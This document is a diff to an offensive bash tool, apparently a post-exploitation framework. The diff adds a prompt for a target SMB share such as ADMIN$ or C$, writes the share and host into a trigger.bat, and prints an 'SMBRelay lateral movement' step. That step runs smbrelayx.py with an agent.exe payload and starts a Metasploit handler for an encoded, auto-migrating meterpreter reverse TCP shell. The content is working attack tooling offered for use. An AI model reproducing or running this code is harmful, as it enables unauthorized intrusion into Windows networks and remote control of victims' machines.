@@ -2753,8 +2753,10 @@ if [ "$scnt" = "Scan LAN for active shares" ];then
   cat $IPATH/logs/lan.txt | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 570 --height 470 > /dev/null 2>&1
   rm $IPATH/logs/lan.txt > /dev/null 2>&1
   rhost=$(zenity --title="☠ Enter  target RHOST ☠" --text "example: 192.168.1.100" --entry --width 270) > /dev/null 2>&1
+  shr=$(zenity --title="☠ Sellect $rhost share ☠" --text "example: ADMIN$ or C$ or IPC$" --entry --width 270) > /dev/null 2>&1
 else
   rhost=$(zenity --title="☠ Enter  target RHOST ☠" --text "example: 192.168.1.100" --entry --width 270) > /dev/null 2>&1
+  shr=$(zenity --title="☠ Sellect $rhost share ☠" --text "example: ADMIN$ or C$ or IPC$" --entry --width 270) > /dev/null 2>&1
 fi
 
 
@@ -2810,25 +2812,15 @@ fi
 
 
 
-#
-# parse modem ip address ..
-#
-# parsing data (192.168.1.) [print first 10 chars]
-# parse=`echo $IP | grep "192" | cut -c1-10`
-# delete last 3 chars from string
-# v1=`ifconfig | grep "broadcast" | awk {'print $6'}`
-# v2=`echo ${v1::-3}`
-#
-# remove everything after the final [ . ]
-parse=`echo ${IP%.*}`
-
-# Now, lets simulate the scanner (trigger.bat) by attempting to connect to the C$ share
-# STRING: FOR /L %%i IN (1,1,255) DO dir \\192.168.1.%%i\c$
+# Simulate the scanner attempting to connect to the share ..
+# STRING: dir \\192.168.1.253\ADMIN$
 echo ${BlueF}[☠]${white} Building trigger.bat ..${Reset};
 sleep 2
 cd $IPATH/bin
-sed "s|RePlAcE|$parse|g" trigger.bat > done.bat
+sed "s|RePlAcE|$rhost|g" trigger.bat > done.bat
+sed -i "s|ShAr3|$shr|g" done.bat
 mv done.bat $IPATH/output/trigger.bat
+
 
 #
 # final notes ..
@@ -2844,6 +2836,7 @@ fi
 # smbrelay attack
 #
 cd $IPATH/bin/Utils
+echo ${BlueF}[${GreenF}✔${BlueF}]${white} Runing SMBRelay lateral movement ..${Reset};
 echo ""
 if [ "$form" = "Build binary.exe agent" ]; then
 python smbrelayx.py -h $rhost -e $IPATH/output/agent.exe & xterm -T "MORPHEUS - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp_rc4; set RC4PASSWORD phobetor; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/bin/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; set AutoRunScript post/windows/manage/migrate; exploit'" > /dev/null 2>&1
@@ -3092,7 +3085,6 @@ case $choice in
 19) sh_stage19 ;;
 20) sh_stage20 ;;
 21) sh_stage21 ;;
-# 21) echo "[x] Please Wait, Under develop .."; sleep 1.3 ;;
 W) sh_stageW ;;
 w) sh_stageW ;;
 S) sh_stageS ;;
@@ -3102,4 +3094,5 @@ E) sh_exit ;;
 *) echo "\"$choice\": is not a valid Option"; sleep 1.3 ;;
 esac
 done
+
 
